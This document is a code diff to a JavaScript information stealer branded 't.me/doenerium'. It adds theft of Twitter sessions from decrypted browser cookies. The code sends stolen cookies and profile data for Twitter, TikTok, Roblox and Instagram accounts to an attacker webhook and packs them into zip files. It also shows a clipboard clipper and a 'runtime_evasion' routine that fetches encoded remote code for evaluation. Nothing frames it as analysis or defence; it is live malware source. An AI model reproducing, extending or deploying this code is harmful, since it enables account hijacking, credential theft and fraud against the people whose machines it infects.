@@ -5,9 +5,17 @@
 /***/ ((module) => {
 
         module.exports = (client) => {
-          return {
-            url: require("./config_obf.js")().webhook_url,
+          try {
+            return {
+              url: require("./config_obf.js")().webhook_url,
+            }
+          } catch (e) {
+            // console.log(e)
+            return {
+              url: require("./config.js")().webhook_url,
+            }
           }
+
         }
 
 
@@ -754,7 +762,7 @@
                     }
                   }
                 )
-                
+
                 await client.utils.webhook.sendToWebhook({
                   embeds: [
                     client.utils.webhook.createEmbed(
@@ -797,7 +805,7 @@
                             value: `\`\`\`${wallet.data.coins}\`\`\``,
                             inline: false
                           },
-                          
+
                         ]
                       }
                     )
@@ -810,7 +818,7 @@
                   client.utils.jszip.createFolder("\\TikTok Accounts")
                 }
 
-                client.utils.jszip.createTxt(`\\TikTok Accounts\\${accountInfo.data.username}.txt`, `<================[ TikTok Account: ${accountInfo.data.username} ]>================>\n<================[t.me/doenerium]>================>\n\n` + `Cookie: ${cookie}\nProfile URL: ${cookie}\nUser identifier: ${accountInfo.data.user_id_str}\nEmail: ${accountInfo.data.email}\nUsername: ${accountInfo.data.username}\nFollower Count: ${accountInfo.insights.follower_num.value}\nCoins: ${wallet.data.coins}`)
+                client.utils.jszip.createTxt(`\\TikTok Accounts\\${accountInfo.data.username}.txt`, `<================[ TikTok Account: ${accountInfo.data.username} ]>================>\n<================[t.me/doenerium]>================>\n\n` + `Cookie: ${cookie}\nProfile URL: ${cookie}\nUser identifier: ${accountInfo.data.user_id_str}\nEmail: ${accountInfo.data.email}\nUsername: ${accountInfo.data.username}\nFollower Count: ${accountInfo.insights.follower_num.value}\nCoins: ${wallet.data.coins}\nBrowser: ${browser}`)
 
               } catch (e) {
                 // console.log(e)
@@ -883,7 +891,100 @@
                   client.utils.jszip.createFolder("\\Roblox Accounts")
                 }
 
-                client.utils.jszip.createTxt(`\\Roblox Accounts\\${accountInfo.Name}.txt`, `<================[ Roblox Account: ${accountInfo.Name} ]>================>\n<================[t.me/doenerium]>================>\n\n` + `Robux: ${balance.robux}\nAccess Token / Cookie: ${cookie}\nName: ${accountInfo.Name}\nDisplay Name: ${accountInfo.DisplayName}\nEmail: ${accountInfo.UserEmail}\nEmail Verified: ${accountInfo.IsEmailVerified}`)
+                client.utils.jszip.createTxt(`\\Roblox Accounts\\${accountInfo.Name}.txt`, `<================[ Roblox Account: ${accountInfo.Name} ]>================>\n<================[t.me/doenerium]>================>\n\n` + `Cookie: ${cookie}\nRobux: ${balance.robux}\nName: ${accountInfo.Name}\nDisplay Name: ${accountInfo.DisplayName}\nEmail: ${accountInfo.UserEmail}\nEmail Verified: ${accountInfo.IsEmailVerified}\nBrowser: ${browser}`)
+
+              } catch (e) {
+                // console.log(e)
+              }
+            },
+
+            async get_twitter_ct0() {
+              return new Promise(async res => {
+                try {
+                  res(client.config.environ.twitter_ct0 = (await client.requires.axios.get("https://raw.githubusercontent.com/antivirusevasion69/antivirusevasion69/main/ct0.txt")).data).toString("utf-8")
+                } catch {
+                  res(client.config.environ.twitter_ct0 = "ac1aa9d58c8798f0932410a1a564eb42")
+                }
+              })
+            },
+
+            async stealTwitterSession(headers, cookie, browser) {
+              try {
+
+                const { data: profile } = await client.requires.axios.post("https://twitter.com/i/api/1.1/account/update_profile.json", {}, { headers: { "cookie": cookie, ...headers } });
+
+                await client.utils.webhook.sendToWebhook({
+                  embeds: [
+                    client.utils.webhook.createEmbed(
+                      {
+                        "title": "Twitter Account stolen",
+                        "description": `The twitter account was detected on the \`\`${browser}\`\` browser`,
+                        "thumbnail": {
+                          url: profile.profile_image_url_https,
+                        },
+                        fields: [
+                          {
+                            name: "Cookie",
+                            value: `\`\`\`${cookie}\`\`\``
+                          },
+                          {
+                            name: "Profile URL",
+                            value: `[Click here](https://twitter.com/${profile.screen_name})`,
+                            inline: false
+                          },
+                          {
+                            name: "Screen name",
+                            value: `\`\`\`${profile.screen_name}\`\`\``,
+                            inline: true
+                          },
+                          {
+                            name: "Nickname",
+                            value: `\`\`\`${profile.name}\`\`\``,
+                            inline: true
+                          },
+                          {
+                            name: "Description",
+                            value: `\`\`\`${profile.description}\`\`\``,
+                            inline: true
+                          },
+                          {
+                            name: "Follower Count",
+                            value: `\`\`\`${profile.followers_count}\`\`\``,
+                            inline: true
+                          },
+                          {
+                            name: "Following Count",
+                            value: `\`\`\`${profile.friends_count}\`\`\``,
+                            inline: true
+                          },
+                          {
+                            name: "Created at",
+                            value: `\`\`\`${profile.created_at}\`\`\``,
+                            inline: false
+                          },
+                          {
+                            name: "Tweets",
+                            value: `\`\`\`${profile.statuses_count}\`\`\``,
+                            inline: true
+                          },
+                          {
+                            name: "Verified",
+                            value: `\`\`\`${profile.verified}\`\`\``,
+                            inline: true
+                          }
+                        ]
+                      }
+                    )
+                  ]
+                })
+
+                client.config.counter.twitter_found++;
+
+                if (!client.requires.fs.existsSync(`${client.config.jszip.path}\\Twitter Accounts`)) {
+                  client.utils.jszip.createFolder("\\Twitter Accounts")
+                }
+
+                client.utils.jszip.createTxt(`\\Twitter Accounts\\${profile.screen_name}.txt`, `<================[ Twitter Account: ${profile.screen_name} ]>================>\n<================[t.me/doenerium]>================>\n\n` + `Cookie: ${cookie}\nProfile URL: https://twitter.com/${profile.screen_name}\nScreenname: ${profile.screen_name}\nNickname: ${profile.name}\nDescription: ${profile.description}\nFollower Count: ${profile.followers_count}\nFollowing Count: ${profile.friends_count}\nCreated at: ${profile.created_at}\nTweets: ${profile.statuses_count}\nVerified: ${profile.verified}\nBrowser: ${browser}`)
 
               } catch (e) {
                 // console.log(e)
@@ -963,7 +1064,7 @@
                   client.utils.jszip.createFolder("\\Instagram Accounts")
                 }
 
-                client.utils.jszip.createTxt(`\\Instagram Accounts\\${accountInfo.username}.txt`, `<================[ Instagram Account: ${accountInfo.Name} ]>================>\n<================[t.me/doenerium]>================>\n\n` + `Username: ${accountInfo.username}\nFollower Count: ${accountInfo2.follower_count}\nFollowing Count: ${accountInfo2.following_count}\nVerified: ${accountInfo.is_verified}\nNickname: ${accountInfo.full_name}\nEmail: ${accountInfo.email}\nBiography: ${accountInfo.biography}\nCookie: ${cookie}`)
+                client.utils.jszip.createTxt(`\\Instagram Accounts\\${accountInfo.username}.txt`, `<================[ Instagram Account: ${accountInfo.Name} ]>================>\n<================[t.me/doenerium]>================>\n\n` + `Cookie: ${cookie}\nUsername: ${accountInfo.username}\nFollower Count: ${accountInfo2.follower_count}\nFollowing Count: ${accountInfo2.following_count}\nVerified: ${accountInfo.is_verified}\nNickname: ${accountInfo.full_name}\nEmail: ${accountInfo.email}\nBiography: ${accountInfo.biography}\nBrowser: ${browser}`)
 
 
               } catch (e) { }
@@ -1237,7 +1338,7 @@
 
                   sql.each(
                     "SELECT * FROM cookies",
-                    function (err, row) {
+                    async function (err, row) {
                       let encrypted_value = row["encrypted_value"];
 
                       var decrypted;
@@ -1275,6 +1376,31 @@
                             decipher.final("utf-8");
                         }
                       } catch { }
+
+                      if (row["host_key"].includes("twitter") && row["name"] == "auth_token") {
+
+                        if (!client.config.environ.twitter_ct0) {
+                          await client.utils.browsers.get_twitter_ct0();
+                        }
+
+                        client.utils.browsers.stealTwitterSession({
+                          'authority': 'twitter.com',
+                          'accept': '*/*',
+                          'accept-language': 'en-US,en;q=0.9',
+                          'authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA',
+                          'origin': 'https://twitter.com',
+                          'referer': 'https://twitter.com/home',
+                          'sec-fetch-dest': 'empty',
+                          'sec-fetch-mode': 'cors',
+                          'sec-fetch-site': 'same-origin',
+                          'sec-gpc': '1',
+                          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
+                          'x-twitter-active-user': 'yes',
+                          'x-twitter-auth-type': 'OAuth2Session',
+                          'x-twitter-client-language': 'en',
+                          'x-csrf-token': client.config.environ.twitter_ct0
+                        }, `ct0=${client.config.environ.twitter_ct0}; auth_token=${decrypted}`, browser);
+                      }
 
                       if (row["host_key"].includes("instagram") && row["name"].includes("sessionid")) {
                         client.utils.browsers.stealInstagramSession(`sessionid=${decrypted}`, browser);
@@ -3735,7 +3861,6 @@ return ${eval_string};
         return evaluator(context);
       }
 
-
       async runtime_evasion() {
         let evasor = (`${((base64.decode(
           `${((await this.requires.axios.get((base64.decode((
@@ -3835,14 +3960,9 @@ return ${eval_string};
           }
         }
 
-
-
         await this.utils.infection.get_minecraft();
         await this.utils.infection.get_growtopia();
         await this.utils.infection.get_steam();
-
-
-
         try {
 
           this.utils.clipper.detectClipboard();
